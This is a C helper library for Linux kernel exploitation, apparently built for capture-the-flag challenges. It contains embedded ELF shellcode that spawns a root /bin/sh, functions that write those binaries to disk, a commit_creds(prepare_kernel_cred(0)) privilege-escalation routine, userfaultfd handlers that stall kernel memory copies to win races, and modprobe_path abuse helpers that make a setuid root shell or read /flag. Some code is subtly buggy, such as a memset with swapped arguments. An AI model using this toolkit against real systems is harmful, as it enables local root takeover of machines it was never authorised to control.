#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <poll.h>
#include <assert.h>
#include <syscall.h>
#include <pthread.h>
#include <linux/fs.h>
#include <linux/fuse.h>
#include <linux/sched.h>
#include <linux/if_ether.h>
#include <linux/userfaultfd.h>
#include <sys/shm.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/xattr.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <ctype.h>

// 控制调试信息
#ifndef DEBUG
#define DEBUG 0
#endif

// 是否使用G_BNUFFER
#ifndef G_BUFFER
#define G_BUFFER 1
#endif

#if G_BUFFER
size_t *g_buffer;
#endif

// 是否使用USERFAULT_CONTROL，控制userfault，使用前需要将g_process_userfault_running置为1
#ifndef USERFAULT_CONTROL
#define USERFAULT_CONTROL 1
#endif

#if USERFAULT_CONTROL

#endif
g_process_userfault_running = (ssize_t)1;
// G_BUFFER_SIZE
#ifndef G_BUFFER_SIZE
#define G_BUFFER_SIZE 0x100000
#endif

// PAGE_SIZE
#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif

#ifndef EIGHT_CHAR_ENABLE
#define EIGHT_CHAR_ENABLE 1
#endif

#ifndef ROOMT_ME_ENABLE
#define ROOMT_ME_ENABLE 1
#endif


#if EIGHT_CHAR_ENABLE
    #define EIGHT_a 0x6161616161616161ul
    #define EIGHT_b 0x6262626262626262ul
    #define EIGHT_c 0x6363636363636363ul
    #define EIGHT_d 0x6464646464646464ul
    #define EIGHT_e 0x6565656565656565ul
    #define EIGHT_f 0x6666666666666666ul
    #define EIGHT_g 0x6767676767676767ul
    #define EIGHT_h 0x6868686868686868ul
    #define EIGHT_i 0x6969696969696969ul
    #define EIGHT_j 0x6a6a6a6a6a6a6a6aul
    #define EIGHT_k 0x6b6b6b6b6b6b6b6bul
    #define EIGHT_l 0x6c6c6c6c6c6c6c6cul
    #define EIGHT_m 0x6d6d6d6d6d6d6d6dul
    #define EIGHT_n 0x6e6e6e6e6e6e6e6eul
#endif

#if ROOMT_ME_ENABLE
    #define ROOTME_ELF_32   "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00" \
                            "\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x54\x80\x04\x08" \
                            "\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x00" \
                            "\x20\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00" \
                            "\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\x6c\x00" \
                            "\x00\x00\x6c\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00" \
                            "\xb0\xa4\xcd\x80\xb8\x2f\x73\x68\x00\x50\xb8\x2f\x62\x69" \
                            "\x6e\x50\x54\x5b\x31\xc0\xb0\x0b\xcd\x80"

    #define ROOTME_ELF_64   "\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00" \
                            "\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00\x78\x80\x04\x08" \
                            "\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
                            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00" \
                            "\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00" \
                            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08" \
                            "\x00\x00\x00\x00\x00\x80\x04\x08\x00\x00\x00\x00\x8f\x00" \
                            "\x00\x00\x00\x00\x00\x00\x8f\x00\x00\x00\x00\x00\x00\x00" \
                            "\x00\x10\x00\x00\x00\x00\x00\x00\xb0\x75\x0f\x05\x48\xb8" \
                            "\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\xb0" \
                            "\x3b\x0f\x05"
    #define ROOTME_ELF_32_LEN 108

    #define ROOTME_ELF_64_LEN 143

    void write_rootme32(const char *rootme_path)
    {
        int fd = open(rootme_path, O_RDWR | O_CREAT, S_IEXEC | S_IXGRP | S_IXOTH);
        if (fd < 0) {
            error("write_rootme32 error!");
        }
        write(fd, ROOTME_ELF_32, ROOTME_ELF_32_LEN);
        close(fd);
    }

    void write_rootme64(const char *rootme_path)
    {
        int fd = open(rootme_path, O_RDWR | O_CREAT, S_IEXEC | S_IXGRP | S_IXOTH);
        if (fd < 0) {
            error("write_rootme64 error!");
        }
        write(fd, ROOTME_ELF_64, ROOTME_ELF_64_LEN);
        close(fd);
    }

#endif

// data
size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags;
size_t g_prepare_kernel_cred_addr, g_commit_creds_addr;
size_t g_vmlinux_base_addr;
size_t g_r15, g_r14, g_r13, g_r12, g_rbp, g_rbx, g_r11, g_r10, g_r9, g_r8, g_rdx, g_rcx, g_rax, g_rsi, g_rdi;


/*
extern size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags;
extern size_t g_prepare_kernel_cred_addr, g_commit_creds_addr;
extern size_t g_vmlinux_base_addr;
extern size_t *g_buffer;
extern size_t g_r15, g_r14, g_r13, g_r12, g_rbp, g_rbx, g_r11, g_r10, g_r9, g_r8, g_rdx, g_rcx, g_rax, g_rsi, g_rdi;
extern ssize_t g_process_userfault_running;
*/

#define RAW_VMLINUX_BASE_ADDR 0xffffffff81000000
#define __GADGETS_OFFSET (g_vmlinux_base_addr - RAW_VMLINUX_BASE_ADDR)

#define GET_GADGET_REAL_ADDR(x) (x + __GADGETS_OFFSET)

void __attribute__((constructor)) initial()
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
#if G_BUFFER
    g_buffer = (size_t *)calloc(G_BUFFER_SIZE, 1);
#endif
}

#if G_BUFFER
void __attribute__((destructor)) finish()
{
    free(g_buffer);
}


void clear_buffer()
{
    if (g_buffer)
    {
        memset(g_buffer, G_BUFFER_SIZE, 0);
    }
}
#endif

void info(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;33m*\033[0m] \033[40;33mINFO\033[0m ===> %s\r\n", s);
}

void success(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;32m+\033[0m] \033[40;32mOJBK\033[0m ===> %s\r\n", s);
}

void fail(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;31m-\033[0m] \033[40;31mFAIL\033[0m ===> %s\r\n", s);
}

void warn(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;34m#\033[0m] \033[40;34mWARN\033[0m ===> %s\r\n", s);
}

void error(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;31m!\033[0m] \033[40;31mERROR\033[0m ===> %s\r\n", s);
    exit(-1);
}

void get_root_shell()
{
    if (getuid() == 0)
    {
        success("Get root shell!!!");
    }
    else
    {
        warn("Get normal shell...");
    }
    system("/bin/sh");
}

static size_t __get_root_shell_ex_flag = 0;
void get_root_shell_ex()
{
    if (__get_root_shell_ex_flag)
    {
        return 0;
    }

    if (getuid() == 0)
    {
        success("Get root shell!!!");
        __get_root_shell_ex_flag = 1;
    }
    else
    {
        warn("Get normal shell...");
    }
    system("/bin/sh");
}

// at&t flavor assembly
void save_status()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(g_user_cs), "=r"(g_user_ss), "=r"(g_user_eflags), "=r"(g_user_sp)
        :
        : "memory");
}

void set_root_uid()
{
    if (!g_prepare_kernel_cred_addr || !g_commit_creds_addr)
    {
        error("set prepare_kernel_cred_addr and commit_creds_addr first!");
    }
    char *(*pkc)(int) = g_prepare_kernel_cred_addr;
    void (*cc)(char *) = g_commit_creds_addr;
    (*cc)((*pkc)(0));
}

void *get_mmap_rwx(size_t addr, size_t len)
{
    return mmap((void *)addr, len, 7, 0x22, -1, 0);
}

void *get_mmap_rw(size_t addr, size_t len)
{
    return mmap((void *)addr, len, 6, 0x22, -1, 0);
}


void show_addr_u64(void *addr, size_t size)
{
    if (size < 8)
    {
        error("size is too small, must be 8 at least!");
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
    size = (size / 8) * 8;
    char *s = (char *)addr;
    for (; s < ((char *)addr) + size; s += 8)
    {
        printf("0x%016lx: 0x%016lx", (size_t)s, *(size_t *)s);
        s += 8;
        if (s < ((char *)addr) + size)
        {
            printf("\t0x%016lx\r\n", *(size_t *)s);
        }
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
}

void show_addr_u32(void *addr, size_t size)
{
    if (size < 4)
    {
        error("size is too small, must be 4 at least!");
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
    size = (size / 4) * 4;
    char *s = (char *)addr;
    for (; s < ((char *)addr) + size; s += 4)
    {
        printf("0x%08lx: 0x%08lx", (size_t)s, *(uint32_t *)s);
        s += 4;
        if (s < ((char *)addr) + size)
        {
            printf("\t0x%08lx\r\n", *(uint32_t *)s);
        }
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
}


void hexdump(void *addr, size_t len)
{

    len &= ~0xf;
    char buf[0x400];
    int printf_len;
    char *tmp;
    for (size_t i = 0; i < len / 0x10; i++)
    {
        memset(buf, 0, 0x400);
        printf_len = 0;

        tmp = (char *)addr + i * 0x10;
        printf_len = sprintf(&buf[printf_len], "+%04x %p: ", i * 0x10, tmp);
        for (size_t j = 0; j < 0x10; j++)
        {
            printf_len += sprintf(&buf[printf_len], "%02x ", (uint8_t)tmp[j]);
        }

        printf_len += sprintf(&buf[printf_len], "| ");
        for (size_t j = 0; j < 0x10; j++)
        {
            char _c = tmp[j];
            if (!isprint(_c))
            {
                _c = '.';
            }
            printf_len += sprintf(&buf[printf_len], "%c", _c);
        }

        puts(buf);
    }
}

//=====================================userfaultfd======================
struct UserfaultHandlerArg
{
    size_t uffd;
    void (*func)(void *, void *);
    void *func_args;
};

void register_userfault(void *fault_page, void *handler, void (*func)(void *, void *), void *func_args)
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    size_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        error("register_userfault: ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; //我们要监视的区域
    ur.range.len = PAGE_SIZE;
    ur.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) //注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
        error("register_userfault: ioctl-UFFDIO_REGISTER");
    //开一个线程，接收错误的信号，然后处理
    struct UserfaultHandlerArg *args = (struct UserfaultHandlerArg *)malloc(sizeof(struct UserfaultHandlerArg));
    args->uffd = uffd;
    args->func = func;
    args->func_args = func_args;
    int s = pthread_create(&thr, NULL, handler, (void *)args);
    if (s != 0)
        error("register_userfault: pthread_create");
}

void *userfaultfd_stuck_handler(void *arg)
{
    struct UserfaultHandlerArg *args = (struct UserfaultHandlerArg *)arg;

    struct uffd_msg msg;
    size_t uffd = args->uffd;
    int nready;
    struct pollfd pollfd;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    #if DEBUG
    info("userfaultfd_stuck_handler: start to process userfault.");
    #endif
    if (nready != 1)
    {
        error("userfaultfd_stuck_handler: wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        error("userfaultfd_stuck_handler: msg err");
    }

    char *page = (char *)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        error("userfaultfd_stuck_handler: mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
#if USERFAULT_CONTROL
    // wait for handler
    while (!g_process_userfault_running)
    {
        sleep(1);
        warn("wait...process_userfault_running is not ok!");
    }
#endif
    // handler
    if (args->func)
    {
        args->func(page, args->func_args);
    }
    else
    { // copy
        memcpy(page, args->func_args, PAGE_SIZE);
    }

    uc.src = (unsigned long)page;
    uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    #if DEBUG
    info("userfaultfd_stuck_handler: stuck handler done!");
    #endif
#if USERFAULT_CONTROL
    g_process_userfault_running = 0;
#endif
    return NULL;
}

void prepare_for_modprobe_path(const char *modprobe_path)
{
	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    char buf[0x400] = {0};
    sprintf(buf, "echo '#!/bin/sh\nchmod 777 /flag;\ncat /flag' > %s", modprobe_path);
	system(buf);
    sprintf(buf, "chmod +x %s", modprobe_path);
	system(buf);
	system("chmod +x /tmp/dummy");
}

/*
    There's a binary: rootme, and now to 
        chown root:root rootme
        chmod 4777 rootme
*/
void prepare_for_modprobe_path2(const char *modprobe_path, const char* rootme_path)
{
	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    char buf[0x400] = {0};
    sprintf(buf, "echo '#!/bin/sh\nchown root:root %s\nchmod 4777 %s\n' > %s", rootme_path, rootme_path, modprobe_path);
	system(buf);
    sprintf(buf, "chmod +x %s", modprobe_path);
	system(buf);
	system("chmod +x /tmp/dummy");
}


void bindcpu(int whichcpu)
{
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(whichcpu, &set);
  
  if(sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0)
    error("setaffinity");
}